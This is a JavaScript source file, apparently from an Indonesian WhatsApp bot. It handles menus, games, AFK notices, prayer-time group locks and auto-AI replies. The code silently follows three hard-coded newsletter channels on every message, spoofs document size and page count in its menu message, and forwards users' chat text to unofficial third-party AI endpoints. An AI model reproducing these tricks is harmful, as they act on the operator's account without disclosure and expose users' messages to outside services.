        const xdate = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
        const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
        const time2 = moment.tz('Asia/Jakarta').format('HH : mm : ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')
         if(time2 < "23:59:00"){
var Waktu = `Selamat Malam ğŸŒŒ`
 }
 if(time2 < "19:00:00"){
var Waktu = `Selamat Malam ğŸŒƒ`
 }
 if(time2 < "18:00:00"){
var Waktu = `Selamat Malam ğŸŒƒ`
 }
 if(time2 < "15:00:00"){
var Waktu = `Selamat Sore ğŸŒ…`
 }
 if(time2 < "11:00:00"){
var Waktu = `Selamat pagi ğŸŒ„`
 }
 if(time2 < "05:00:00"){
var Waktu = `Selamat Pagi ğŸŒ„`
 } 
 
 function cekOperator(nomor) {
 let num = nomor.replace(/\D/g, '')
 if (num.startsWith('62')) num = '0' + num.slice(2)

 const prefix = num.slice(0, 4)

 const operator = {
  '0811':'Telkomsel','0812':'Telkomsel','0813':'Telkomsel','0821':'Telkomsel',
  '0822':'Telkomsel','0823':'Telkomsel','0851':'Telkomsel','0852':'Telkomsel','0853':'Telkomsel',

  '0814':'Indosat','0815':'Indosat','0816':'Indosat',
  '0855':'Indosat','0856':'Indosat','0857':'Indosat','0858':'Indosat',

  '0817':'XL','0818':'XL','0819':'XL','0859':'XL','0877':'XL','0878':'XL',

  '0831':'Axis','0832':'Axis','0833':'Axis','0838':'Axis',

  '0895':'Tri','0896':'Tri','0897':'Tri','0898':'Tri','0899':'Tri',

  '0881':'Smartfren','0882':'Smartfren','0883':'Smartfren','0884':'Smartfren',
  '0885':'Smartfren','0886':'Smartfren','0887':'Smartfren','0888':'Smartfren','0889':'Smartfren'
 }

 return {
  nomor: num,
  prefix,
  operator: operator[prefix] || 'Tidak diketahui'
 }
}
async function totalfiturr() {
   const fitur1 = () =>{
            var mytext = fs.readFileSync("./Vynaa.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length
            return numUpper
        }
   const fitur2 = () =>{
            var mytext = fs.readFileSync("./Vynaa.js").toString()
            var numUpper = (mytext.match(/case "/g) || []).length
            return numUpper
        }
 valvul = `${fitur1()} + ${fitur2()}`
.replace(/[^0-9\-\/+*Ã—Ã·Ï€Ee()piPI/]/g, '')
.replace(/Ã—/g, '*')
.replace(/Ã·/g, '/')
.replace(/Ï€|pi/gi, 'Math.PI')
.replace(/e/gi, 'Math.E')
.replace(/\/+/g, '/')
.replace(/\++/g, '+')
.replace(/-+/g, '-')
let format = valvul
.replace(/Math\.PI/g, 'Ï€')
.replace(/Math\.E/g, 'e')
.replace(/\//g, 'Ã·')
.replace(/\*Ã—/g, 'Ã—')
try {

let resulto = (new Function('return ' + valvul))()
if (!resulto) throw resulto
return resulto
} catch (e) {
if (e == undefined) return 
console.log("!")
}
}
const totalfitur = await totalfiturr()
function generateSmartMenu({
  namaBot,
  pushname,
  senderNumber,
  sender,
  isOwner,
  isPremium,
  sock,
  db,
  teks = '',
  runtime,
  totalfitur,
  checkLimit,
  cekOperator,
  caseDir = './Vynaa',
  pluginDir = './ZionPlugins'
}) {
  const fs = require('fs')
  const os = require('os')
  const { performance } = require('perf_hooks')

  const used = process.memoryUsage()

  const cpus = os.cpus().map(cpu => {
    cpu.total = Object.values(cpu.times).reduce((a, b) => a + b, 0)
    return cpu
  })

  const cpu = cpus.reduce((last, cpu, _, { length }) => {
    last.total += cpu.total
    last.speed += cpu.speed / length
    last.times.user += cpu.times.user
    last.times.nice += cpu.times.nice
    last.times.sys += cpu.times.sys
    last.times.idle += cpu.times.idle
    last.times.irq += cpu.times.irq
    return last
  }, {
    speed: 0,
    total: 0,
    times: { user: 0, nice: 0, sys: 0, idle: 0, irq: 0 }
  })

  const start = performance.now()
  const end = performance.now()
  const latensi = end - start

  const limits = checkLimit(sender)
  const opr = cekOperator(senderNumber)

  const mainFile = './main.js'

  let totalCase = totalfitur || 0
  if (fs.existsSync(caseDir)) {
    totalCase = fs.readdirSync(caseDir).filter(f => f.endsWith('.js')).length
  }

  let totalPlugin = 0
  if (fs.existsSync(pluginDir)) {
    totalPlugin = fs.readdirSync(pluginDir).filter(f => f.endsWith('.js')).length
  }

  const totalMsgTelegram = typeof countTelegramMsg === 'function'
    ? countTelegramMsg(mainFile)
    : 0

  const totalFitur = totalCase + totalPlugin + totalMsgTelegram

  return `
ğŸ¤– SMART ASSISTANT
${namaBot}
Always ready â€¢ Always smart

â”€â”€â”€ USER INFO â”€â”€â”€
â€¢ Name    : ${pushname}
â€¢ Number  : ${senderNumber}
â€¢ Network : ${opr?.operator || '-'}
â€¢ Access  : ${isOwner ? 'ğŸ‘‘ Owner' : isPremium ? 'â­ Premium' : 'ğŸ†“ Free'}

â”€â”€â”€ BOT INFO â”€â”€â”€
â€¢ Runtime : ${runtime(process.uptime())}
â€¢ Mode    : ${sock.public ? 'Public' : 'Self'}
â€¢ Feature : ${totalFitur}
â€¢ Users   : ${Object.values(db.users || {}).length}
â€¢ Speed   : ${latensi.toFixed(3)} ms

Ketik *.listmenu* untuk melihat semua menu
${teks}
`
}

const menuV1 = async (teksMenu = '') => { // Tambahkan parameter m dan async
  const smartmenu = await generateSmartMenu({ // Tambahkan await jika async
    namaBot,
    pushname,
    senderNumber,
    sender,
    isOwner,
    isPremium,
    sock,
    db,
    teks: teksMenu,
    runtime,
    totalfitur,
    checkLimit,
    cekOperator
  })

  return await sock.sendMessage(m.chat, {
    document: { url: thumbnail },
    mimetype: 'application/pdf',
    fileName: `${name} â€¢ ${version}`,
    fileLength: 100000000000000,
    pageCount: 2026,
    caption: smartmenu,
    footer: name,
    viewOnce: true,
    buttons: [
      {
        buttonId: '.owner',
        buttonText: { displayText: 'ğŸ‘‘ OWNER' },
        type: 1
      },
      {
        buttonId: 'smartmenu_full',
        type: 4,
        buttonText: { displayText: 'SMART MENU' },
        nativeFlowInfo: {
          name: 'single_select',
          paramsJson: JSON.stringify({
            title: 'SMART MENU',
            description: 'All features â€¢ No category removed',
            sections: [
              {
                title: 'âš¡ QUICK ACCESS',
                rows: [
                  { title: 'ğŸ“œ All Menu', description: 'Show all commands', id: '.allmenu' },
                  { title: 'ğŸ“‚ Menu List', description: 'List all categories', id: '.menulist' },
                  { title: 'ğŸ“ Script Info', description: 'About this bot', id: '.sc' }
                ]
              },
              {
                title: 'ğŸ‘‘ SYSTEM & OWNER',
                rows: [
                  { title: 'ğŸ‘‘ Owner', description: 'Bot control & config', id: '.menuowner' },
                  { title: 'âš’ï¸ Tools', description: 'System utilities', id: '.menutools' },
                  { title: 'â˜ ï¸ Bug', description: 'Debug & testing', id: '.menubug' },
                  { title: 'â¬‡ï¸ Install', description: 'Installer tools', id: '.menuinstall' }
                ]
              },
              {
                title: 'ğŸ¤– AI & CORE',
                rows: [
                  { title: 'ğŸ¤– AI', description: 'AI chat & generator', id: '.menuai' },
                  { title: 'ğŸ” Search', description: 'Search utilities', id: '.menusearch' },
                  { title: 'ğŸ”’ Encrypt', description: 'Encode & decode', id: '.menuenc' }
                ]
              },
              {
                title: 'ğŸ“¥ MEDIA & CREATOR',
                rows: [
                  { title: 'ğŸ“¥ Download', description: 'Downloader tools', id: '.menudownload' },
                  { title: 'ğŸ” Convert', description: 'Media converter', id: '.menuconvert' },
                  { title: 'ğŸ† Maker', description: 'Sticker & logo maker', id: '.menumaker' },
                  { title: 'ğŸ–¼ï¸ Edit Image', description: 'Image editor', id: '.menueditimg' },
                  { title: 'ğŸŒ… Ephoto', description: 'Photo effects', id: '.menuephoto' }
                ]
              },
              {
                title: 'ğŸ® GAME & RPG',
                rows: [
                  { title: 'ğŸ® Game', description: 'Mini games', id: '.menugame' },
                  { title: 'âš”ï¸ RPG', description: 'Level & battle system', id: '.menurpg' },
                  { title: 'ğŸˆº Genshin', description: 'Genshin tools', id: '.menugenshin' }
                ]
              },
              {
                title: 'ğŸ§‘â€ğŸ§’â€ğŸ§’ SOCIAL & FUN',
                rows: [
                  { title: 'ğŸ§‘â€ğŸ§’â€ğŸ§’ Group', description: 'Group management', id: '.menugroup' },
                  { title: 'ğŸ¤£ Fun', description: 'Fun commands', id: '.menufun' },
                  { title: 'ğŸ”€ Random', description: 'Random content', id: '.menurandom' },
                  { title: 'ğŸ’ª Quotes', description: 'Motivation quotes', id: '.menuquotes' },
                  { title: 'ğŸ’Œ Menfess', description: 'Anonymous confess', id: '.menumenfess' }
                ]
              },
              {
                title: 'ğŸŒ INFO & RELIGION',
                rows: [
                  { title: 'ğŸŒ News', description: 'Latest news', id: '.menuberita' },
                  { title: 'ğŸ“ Primbon', description: 'Primbon & prediction', id: '.menuprimbon' },
                  { title: 'ğŸ•Œ Islamic', description: 'Islamic features', id: '.menuislam' }
                ]
              },
              {
                title: 'ğŸ›ï¸ STORE & STALK',
                rows: [
                  { title: 'ğŸ›ï¸ Store', description: 'Shop & topup', id: '.menustore' },
                  { title: 'ğŸ§ Stalk', description: 'Profile stalker', id: '.menustalk' }
                ]
              },
              {
                title: 'ğŸŒ¥ï¸ SERVER & CLOUD',
                rows: [
                  { title: 'ğŸŒ¥ï¸ Cpanel', description: 'Cpanel tools', id: '.menucpanel' },
                  { title: 'ğŸŒ¤ï¸ Cpanel+', description: 'Advanced cpanel', id: '.menucpanel2' },
                  { title: 'ğŸŒ¥ï¸ Linode', description: 'Linode manager', id: '.menulinode' },
                  { title: 'ğŸŒ¤ï¸ DigitalOcean', description: 'DO cloud tools', id: '.menudigitalocean' }
                ]
              },
              {
                title: 'ğŸ‡¯ğŸ‡µ ANIME & NSFW',
                rows: [
                  { title: 'ğŸ‡¯ğŸ‡µ Anime', description: 'Anime features', id: '.menuanime' },
                  { title: 'ğŸ” NSFW', description: 'Adult content', id: '.menunsfw' }
                ]
              },
              {
                title: 'ğŸ¤” OTHER',
                rows: [
                  { title: 'ğŸ¤” Other', description: 'Additional utilities', id: '.menuother' }
                ]
              }
            ]
          })
        }
      }
    ],
    contextInfo: {
    isForwarded: true, 
forwardingScore: 100, 
businessMessageForwardInfo: 
{ businessOwnerJid: idch }, 
forwardedNewsletterMessageInfo: 
{ newsletterName: name, newsletterJid: idch }, 
      externalAdReply: {
        title: namaBot,
        body: `version â€¢ ${version}`,
        thumbnailUrl: thumbnail,
        mediaType: 1,
        renderLargerThumbnail: true, // Tambahkan sourceUrl
        mediaUrl: '' // Tambahkan mediaUrl kosong jika tidak ada
      }
    }
  }, { quoted: fakeQuoted }) // Tambahkan quoted parameter di sini
}

  
const menuV2 = (teksMenu = '') => {
  const smartmenu = generateSmartMenu({
    namaBot,
    pushname,
    senderNumber,
    sender,
    isOwner,
    isPremium,
    sock,
    db,
    teks: teksMenu, // â¬…ï¸ PENTING
    runtime,
    totalfitur,
    checkLimit,
    cekOperator
  })

  return sock.sendMessage(m.chat, {
    video: { url: video },
    gifPlayback: true,
    caption: smartmenu,
    contextInfo: {
      mentionedJid: [sender],
      externalAdReply: {
        title: `${namaBot}`,
        body: `version â€¢ ${version}`,
        thumbnailUrl: thumbnail2,
        sourceUrl: linkgc,
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
  }, { quoted: fakeQuoted })
}

const menuV3 = (teksMenu = '') => {
  const smartmenu = generateSmartMenu({
    namaBot,
    pushname,
    senderNumber,
    sender,
    isOwner,
    isPremium,
    sock,
    db,
    teks: teksMenu, // â¬…ï¸ PENTING
    runtime,
    totalfitur,
    checkLimit,
    cekOperator
  })

  return sock.sendMessage(m.chat, {
    text: smartmenu,
    mentions: [m.sender],
    contextInfo: {
      mentionedJid: [m.sender],
      externalAdReply: {
        title: `${namaBot}`,
        body: `version â€¢ ${version}`,
        thumbnailUrl: thumbnail,
        renderLargerThumbnail: true,
        mediaType: 1,
        previewType: 1,
        sourceUrl: linkgc
      }
    }
  }, { quoted: fakeQuoted })
}
//
const menuV4 = (teksMenu = '') => {
  const smartmenu = generateSmartMenu({
    namaBot,
    pushname,
    senderNumber,
    sender,
    isOwner,
    isPremium,
    sock,
    db,
    teks: teksMenu, // â¬…ï¸ PENTING
    runtime,
    totalfitur,
    checkLimit,
    cekOperator
  })

  return sock.sendMessage(m.chat, {
            image: {
              url: thumbnail
            },
            caption: smartmenu
          }, {
            quoted: fakeQuoted
          });
        }   
// Function
if (!isOwner && db.chats[m.chat].onlyadmin && !isAdmins && isCmd && !['chat', 'menuu', 'panel', 'tt'].includes(command)) return
            
            if (!isOwner && setting.onlygc && !m.isGroup && isCmd && !['chat', 'menuu', 'panel', 'tt'].includes(command)) return
            
            if (!isOwner && setting.onlypm && !isPrivate && isCmd && !['chat', 'menuu', 'panel', 'tt'].includes(command)) return
            if (setting.autotyping) {
if (command) { sock.readMessages([m.key])}
sock.sendPresenceUpdate('composing', from)
}
if (setting.autoread) {
sock.readMessages([m.key])
        };
        if (setting.autobio) {
			sock.updateProfileStatus(`${namaBot} Telah Berjalan Selama ${runtime(process.uptime())}`).catch(_ => _);
		}
		//
		await sock.newsletterFollow("120363402508663272@newsletter")
await sock.newsletterFollow("120363423625415506@newsletter")
await sock.newsletterFollow("120363424163797384@newsletter")
//
		
async function loading(text) {
      var nln = [
        `Mohon Menunggu [10%]%`,
        `Mohon Menunggu [20%]%`,
        `Mohon Menunggu [30%]%`,
        `Mohon Menunggu [40%]`,
        `Mohon Menunggu [50%]`,
        `Mohon Menunggu [60%]`,
        `Mohon Menunggu [70%]`,
        `Mohon Menunggu [80%]`,
        `Mohon Menunggu [90%]`,
        `Mohon Menunggu [100%]`,
        `${text}`,
      ]
      let {
        key
      } = await sock.sendMessage(from, {
        text: 'Mohon Menunggu'
      }, {
        quoted: fakeQuoted
      })
      
      for (let i = 0; i < nln.length; i++) {
        await sleep(100)
        await sock.sendMessage(from, {
          text: nln[i],
          edit: key
        }, {
          quoted: fakeQuoted
        });
      }
    }
    async function loadingai(text) {
      var nln = [
        `[  ]`,
        `[ Respon Ai ]`,
        `[ Respon Ai ]\n\n${text}`,
      ]
      let {
        key
      } = await sock.sendMessage(from, {
        text: ' '
      }, {
        quoted: fakeQuoted
      })
      
      for (let i = 0; i < nln.length; i++) {
        await sleep(100)
        await sock.sendMessage(from, {
          text: nln[i],
          edit: key
        }, {
          quoted: fakeQuoted
        });
      }
    }
async function React() {
      sock.sendMessage(from, {
        react: {
          text: "ğŸ•‘",
          key: m.key
        }
      })
    }
    //
    if (m.isGroup && !m.key.fromMe) {
    let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]

    for (let ment of mentionUser) {
        if (afk.checkAfkUser(ment, _afk)) {
            let getId2 = afk.getAfkId(ment, _afk)
            let getReason2 = afk.getAfkReason(getId2, _afk)
            let getTimee = Date.now() - afk.getAfkTime(getId2, _afk)
            let durasi = ms(getTimee)

            if (!isOwner) {
                sock.sendMessage(m.chat, {text:`Woeee @${ment.split('@')[0]} balek woee, lu di cariin ${pushname} senpai`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
  
            } else {
                reply(`Jangan tag dia, dia lagi ${getReason2} sejak ${durasi} yg lalu`)
            }
        }
    }

    if (afk.checkAfkUser(m.sender, _afk)) {
        let getId = afk.getAfkId(m.sender, _afk)
        let getReason = afk.getAfkReason(getId, _afk)
        let getTime = Date.now() - afk.getAfkTime(getId, _afk)
        let durasi = ms(getTime)

        _afk.splice(afk.getAfkPosition(m.sender, _afk), 1)
        fs.writeFileSync('./database/user.json', JSON.stringify(_afk))

        sock.sendTextWithMentions(
            m.chat,
            `@${m.sender.split('@')[0]} telah kembali dari afk\nReason: ${getReason}\nDurasi: ${durasi}`,
            m
        )
    }
}
async function Vynaa(promptName, text) {
    let response = await axios.post("https://chateverywhere.app/api/chat/", {
        "model": {
            "id": "gpt-4",
            "name": "GPT-4",
            "maxLength": 32000,
            "tokenLimit": 8000,
            "completionTokenLimit": 5000,
            "deploymentName": "gpt-4"
        },
        "messages": [
            {
                "pluginId": null,
                "content": text,
                "role": "user"
            }
        ],
        "prompt": `
${encodeURIComponent(prompt)}`, 
        "temperature": 0.5
    }, { 
        headers: {
            "Accept": "/*/",
            "User-Agent": "Mozilla/5.0"
        }
    });

    return response.data;
}


// DETEKSI INTENT
function detectIntent(text) {
    text = text.toLowerCase();

    // cari lagu
    if (
        text.includes("cariin lagu") || 
        text.includes("carikan lagu") || 
        text.includes("lagu") && text.includes("cari") ||
        text.includes("tolong putar") ||
        text.includes("play lagu")
    ) {
        let judul = text
            .replace(/cari(in)? lagu|carikan lagu|tolong putar|play lagu/gi, "")
            .trim();

        return { intent: "music", query: judul };
    }

    // cari foto / gambar
    if (
        text.includes("cariin foto") ||
        text.includes("carikan foto") ||
        text.includes("foto") && text.includes("cari") ||
        text.includes("gambar") && text.includes("cari") ||
        text.includes("cari gambar") ||
        text.includes("carikan gambar")
    ) {
        let query = text
            .replace(/cari(in)? foto|carikan foto|cari(in)? gambar|carikan gambar/gi, "")
            .trim();

        return { intent: "image", query };
    }

    return { intent: "normal" };
}


// MAIN EXECUTOR
if (db.chats[m.chat].autoaigc && !m.key.fromMe && !isCmd) {
    try {
        let intent = detectIntent(text);

        switch (intent.intent) {

            // ğŸµ AUTO LAGU
            case "music":
                if (!intent.query) return reply("Judul lagunya apa?");
                return sock.sendMessage(m.chat, { text: `.play ${intent.query}` });

            // ğŸ–¼ï¸ AUTO FOTO / GAMBAR
            case "image":
                if (!intent.query) return reply("Foto apa yang mau dicari?");
                return sock.sendMessage(m.chat, { text: `.pin ${intent.query}` });

            // ğŸ’¬ NORMAL â†’ AI mode
            default:
                const data = await fetchJson(`https://btch.us.kg/openai?text=${encodeURIComponent(text)}`);
                if (data?.result) {
                    return loadai(`${data.result}`);
                } else {
                    let ai = await Vynaa(pushname, text);
                    return reply(ai);
                }
        }

    } catch (err) {
        console.log(err);
        reply("Terjadi error, coba lagi nanti.");
    }
}

if (setting.sholat) {
sock.enhancer = sock.enhancer ? sock.enhancer : {};
        
// Prevent multiple triggers
sock.autoshalat = sock.autoshalat || {};
let id = m.chat;
if (id in sock.autoshalat) return;

// Jadwal sholat
let jadwalSholat = {
    shubuh: '04:29',
    terbit: '05:44',
    dhuha: '06:02',
    dzuhur: '12:02',
    ashar: '15:15',
    magrib: '17:52',
    isya: '19:01',
}

// Waktu WIB
const datek = new Date((new Date).toLocaleString("en-US", { timeZone: "Asia/Jakarta" }));
const timeNow = datek.toTimeString().slice(0,5);

for (let [sholat, waktu] of Object.entries(jadwalSholat)) {

    if (timeNow === waktu) {

        sock.autoshalat[id] = true;

        // ğŸ”Š Notifikasi adzan
        await sock.sendMessage(m.chat, {
            audio: { url: "https://media.vocaroo.com/mp3/1ofLT2YUJAjQ" },
            mimetype: 'audio/mpeg'
        });

        // ğŸ“ Dapatkan semua grup â†’ jadikan array
        let groupsObj = await sock.groupFetchAllParticipating();
        let groupList = Object.keys(groupsObj); // array fix

        // ğŸ”’ Tutup semua grup satu per satu
        for (let jid of groupList) {
            try {
                await sock.groupSettingUpdate(jid, "announcement");
                await sock.sendMessage(jid, { text: `ğŸ”” *Waktu sholat ${sholat}*\nGrup ditutup 5 menit.` });
            } catch (e) {
                console.log("âŒ Gagal menutup grup:", jid, e);
            }
            await new Promise(res => setTimeout(res, 500)); // important
        }

        // â³ Buka lagi setelah 10 menit
        setTimeout(async () => {

            for (let jid of groupList) {
                try {
                    await sock.groupSettingUpdate(jid, "not_announcement");
                    await sock.sendMessage(jid, { text: `âœ… Grup dibuka kembali setelah sholat ${sholat}.` });
                } catch (e) {
                    console.log("âŒ Gagal membuka grup:", jid, e);
                }
                await new Promise(res => setTimeout(res, 600)); // prevent rate limit
            }

            delete sock.autoshalat[id];

        }, 5 * 60 * 1000); // 10 menit
    }
}
}
    function monospace(string) {
return '```' + string + '```'
}
function monospa(string) {
return '`' + string + '`'
}
try {
if (!body || typeof body !== "string") return; // cegah error kalau body undefined

// GAME TEBAK KATA
if (global.tebakkata && global.tebakkata.soal) {
    let { soal, jawaban, waktu } = global.tebakkata
    if (body.toLowerCase().includes(jawaban)) {
        await reply(`Selamat Jawaban Kamu BenarğŸ¥³\n\nSoal:\n${monospace(soal)}\nJawaban: ${jawaban}\n*kamu mendapatkan 20 limit*`)
        clearTimeout(waktu)
        const user = global.db.users[m.sender]
        user.limit = (user.limit || 0) + 20
        delete global.tebakkata
    }
}

// GAME ASAH OTAK
if (global.asahotak && global.asahotak.soal) {
    let { soal, jawaban, waktu } = global.asahotak
    if (body.toLowerCase().includes(jawaban)) {
        await reply(`Selamat Jawaban Kamu BenarğŸ¥³\n\nSoal:\n${monospace(soal)}\nJawaban: ${jawaban}\n*kamu mendapatkan 20 limit*`)
        clearTimeout(waktu)
        const user = global.db.users[m.sender]
        user.limit = (user.limit || 0) + 20
        delete global.asahotak
    }
}

// GAME SUSUN KATA
if (global.susunkata && global.susunkata.soal) {
    let { soal, jawaban, waktu } = global.susunkata
    if (body.toLowerCase().includes(jawaban)) {
        await reply(`Selamat Jawaban Kamu BenarğŸ¥³\n\nSoal:\n${monospace(soal)}\nJawaban: ${jawaban}\n*kamu mendapatkan 20 limit*`)
        clearTimeout(waktu)
        const user = global.db.users[m.sender]
        user.limit = (user.limit || 0) + 20
        delete global.susunkata
    }
}

// GAME TEBAK GAMBAR
if (global.tebakgambar && global.tebakgambar.soal) {
    let { soal, jawaban, waktu } = global.tebakgambar
    if (body.toLowerCase().includes(jawaban)) {
        await reply(`Selamat Jawaban Kamu BenarğŸ¥³\n\nSoal:\n${monospace(soal)}\nJawaban: ${jawaban}\n*kamu mendapatkan 20 limit*`)
        clearTimeout(waktu)
        const user = global.db.users[m.sender]
        user.limit = (user.limit || 0) + 20
        delete global.tebakgambar
    }
}

// GAME TEBAK BENDERA
if (global.tebakbendera && global.tebakbendera.soal) {
    let { soal, jawaban, waktu } = global.tebakbendera
    if (body.toLowerCase().includes(jawaban)) {
        await reply(`Selamat Jawaban Kamu BenarğŸ¥³\n\nSoal:\n${monospace(soal)}\nJawaban: ${jawaban}\n*kamu mendapatkan 20 limit*`)
        clearTimeout(waktu)
        const user = global.db.users[m.sender]
        user.limit = (user.limit || 0) + 20
        delete global.tebakbendera
    }
}

// GAME TEBAK KIMIA
if (global.tebakkimia && !m.key.fromMe && global.tebakkimia.soal) {
    let { soal, jawaban, waktu } = global.tebakkimia
    if (body.toLowerCase().includes(jawaban)) {
        await reply(`Selamat Jawaban Kamu BenarğŸ¥³\n\nSoal:\n${monospace(soal)}\nJawaban: ${jawaban}\n*kamu mendapatkan 20 limit*`)
        clearTimeout(waktu)
        const user = global.db.users[m.sender]
        user.limit = (user.limit || 0) + 20
        delete global.tebakkimia
    }
}

// GAME FAMILY 100
if (global.family && global.family.soal) {
    let { soal, jawaban, waktu } = global.family
    for (let i of jawaban) {
        if (body.toLowerCase().includes(i)) {
            let anu = jawaban.indexOf(i)
            jawaban.splice(anu, 1)
            await reply(`*GAME FAMILY 100*\n\nJawaban kamu benar!\nJawaban: ${i}\n*kamu mendapatkan 20 limit*`)
        }
    }
    if (jawaban.length < 1) {
        clearTimeout(waktu)
        const user = global.db.users[m.sender]
        user.limit = (user.limit || 0) + 20
        delete global.family
    }
}

} catch (err) {
    console.error("Error Game:", err.message)
}

// GAME TEBAK-TEBAKAN
if (global.tebaktebakan && global.tebaktebakan.soal) {
  let { soal, jawaban, waktu } = global.tebaktebakan

  if (body.toLowerCase().includes(jawaban)) {
    await reply(
`ğŸ‰ *JAWABAN BENAR!*

Soal:
${monospace(soal)}

Jawaban:
${monospace(jawaban)}

*kamu mendapatkan 20 limit*`
    )

    clearTimeout(waktu)
    const user = global.db.users[m.sender]
    user.limit = (user.limit || 0) + 20
    delete global.tebaktebakan
  }
}
// GAME TEKA-TEKI
if (global.tekateki && global.tekateki.soal) {
  let { soal, jawaban, waktu } = global.tekateki

  if (body.toLowerCase().includes(jawaban)) {
    await reply(
`ğŸ‰ *JAWABAN BENAR!*

Soal:
${monospace(soal)}

Jawaban:
${monospace(jawaban)}

*kamu mendapatkan 20 limit*`
    )

    clearTimeout(waktu)
    const user = global.db.users[m.sender]
    user.limit = (user.limit || 0) + 20
    delete global.tekateki
  }
}
      //
      let list = []
    for (let i of owner) {
      list.push({
        displayName: await sock.getName(i + '@s.whatsapp.net'),
        vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${await sock.getName(i + '@s.whatsapp.net')}\n
FN:${await sock.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET:${namaBot}@gmail.com\n
item2.X-ABLabel:Email\n
item3.URL:https://${namaBot}.com
item3.X-ABLabel:YouTube\n
item4.ADR:;;Indonesia;;;;\n
item4.X-ABLabel:Region\n
END:VCARD`
      })
    }
    //
    function pickRandom(list) {
	return list[Math.floor(list.length * Math.random())]
}
const vircion = pickRandom(vircsetz)
//
const handleData = { sock, text, args, isCmd, mime, qmsg, isOwner, cmd, command, reply, React, fetchJson, mime, quoted, isGroup, isOwner, participants, isAdmins }
if (isCmd) {
await loadPluginsCommand(m, command, handleData)
}
//
const badwords = JSON.parse(fs.readFileSync('./database/badwords.json'))
const addbadwords = async (kata) => {
let badwords=JSON.parse(fs.readFileSync('./database/badwords.json'))
badwords.push(kata)
fs.writeFileSync('./database/badwords.json',JSON.stringify(badwords))
reply(`Kata kasar "${kata}" berhasil ditambahkan.`)
}

const deletebadwords = async (kata) => {
let badwords=JSON.parse(fs.readFileSync('./database/badwords.json'))
badwords=badwords.filter(word=>word!==kata)
fs.writeFileSync('./database/badwords.json',JSON.stringify(badwords))
reply(`Kata kasar "${kata}" berhasil dihapus.`)
}
//
const { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('./ZionLibrary/list')
let db_respon_list = JSON.parse(fs.readFileSync('./database/list-message.json'))
//
if (m.isGroup && isAlreadyResponList(m.chat, body.toLowerCase(), db_respon_list)) {
    // âœ… Proteksi anti-duplikasi global
    global.lastRespon = global.lastRespon || {};
    const lastKey = `${m.chat}-${body.toLowerCase()}`;
    if (global.lastRespon[lastKey] && Date.now() - global.lastRespon[lastKey] < 2000) return;
    global.lastRespon[lastKey] = Date.now();

    var get_data_respon = getDataResponList(m.chat, body.toLowerCase(), db_respon_list);
    if (get_data_respon.isImage === false) {
        sock.sendMessage(m.chat, { text: sendResponList(m.chat, body.toLowerCase(), db_respon_list) }, { quoted: fakeQuoted });
    } else {
        sock.sendMessage(m.chat, { image: await getBuffer(get_data_respon.image_url), caption: get_data_respon.response }, { quoted: fakeQuoted });
    }
}
//
if (m.isGroup && isAlreadyResponList(m.chat, body.toLowerCase(), db_respon_list)) {
var get_data_respon = getDataResponList(m.chat, body.toLowerCase(), db_respon_list)
if (get_data_respon.isImage === false) {
sock.sendMessage(m.chat, { text: sendResponList(m.chat, body.toLowerCase(), db_respon_list) }, {
quoted: fakeQuoted
})} else {
sock.sendMessage(m.chat, { image: await getBuffer(get_data_respon.image_url), caption: get_data_respon.response }, {quoted: fakeQuoted})
}}
//

//

function randomNomor(min, max = null) {
    if (max !== null) {
        min = Math.ceil(min);
        max = Math.floor(max);
        return Math.floor(Math.random() * (max - min + 1)) + min;
    } else {
        return Math.floor(Math.random() * min) + 1;
    }
}
//
function monospace(string) {
    return '*`' + string + '`*';
}
//
global.menfess = global.menfess ? global.menfess : {}
         let mf = Object.values(global.menfess).find(v => !v.status && v.receiver == m.sender)
         if (mf && body) {
             if (m.isGroup) return reply(`Balas Pesan Menfess Mu Di Private Chat`)
          //  if (!/conversation|extended/.test(m.type)) return reply(`Balas dengan teks biasa.`)
            let text = `ğŸ˜„ Hai kak, kamu menerima pesan balasan nih dari ${mf.receiver.split('@')[0]} pesannya : *${body}*`
            await sock.sendMessage(mf.from, { text: text }).then(async () => {
               reply(`pesan Berhasil Terkirim!!`)
               await sleep(1000)
               delete global.menfess[mf.id]
               return !0
            })
         }     
//
function loadSetMenu() {
    try {
        const setmenuPath = path.join(__dirname, './database/setmenu.json');
        if (!fs.existsSync(setmenuPath)) {
            const defaultData = { menuVersion: 'v1' };
            fs.writeFileSync(setmenuPath, JSON.stringify(defaultData, null, 2));
            return defaultData;
        }
        return JSON.parse(fs.readFileSync(setmenuPath));
    } catch (error) {
        console.error('Error loading setmenu:', error);
        return { menuVersion: 'v1' };
    }
}
//
function handleFeatureToggle(feature, command) {
    if (!m.isGroup) return reply(mess.group);
    if (!isAdmins && !isOwner) return reply(mess.admin);
    if (args.length < 1) return reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan');

    if (args[0] === 'on') {
        db.chats[from][feature] = true;
        return reply(`${command} is enabled`);
    } else if (args[0] === 'off') {
        db.chats[from][feature] = false;
        return reply(`${command} is disabled`);
    }
}
//
function toRupiah(angka) {
    var saldo = '';
    var angkarev = angka.toString().split('').reverse().join('');
    for (var i = 0; i < angkarev.length; i++)
        if (i % 3 == 0) saldo += angkarev.substr(i, 3) + '.';
    return '' + saldo.split('', saldo.length - 1).reverse().join('');
}
//
const tujuanA = path.join(__dirname, 'ZionLibrary', 'database', 'products.json');
const tujuanB = path.join(__dirname, 'ZionLibrary', 'database', 'historyt.json');
const tujuanC = path.join(__dirname, 'ZionLibrary', 'database', 'discounts.json');

function getDisczz() {
    if (!fs.existsSync(tujuanC)) {
        fs.writeFileSync(tujuanC, '[]', 'utf-8');
    }
    const discountData = fs.readFileSync(tujuanC, 'utf-8');
    return JSON.parse(discountData);
}

function addDisczz(productName, discountPrice, expirationDate) {
    const discounts = getDisczz();
    const newDiscount = {
        produk: productName,
        harga_diskon: discountPrice,
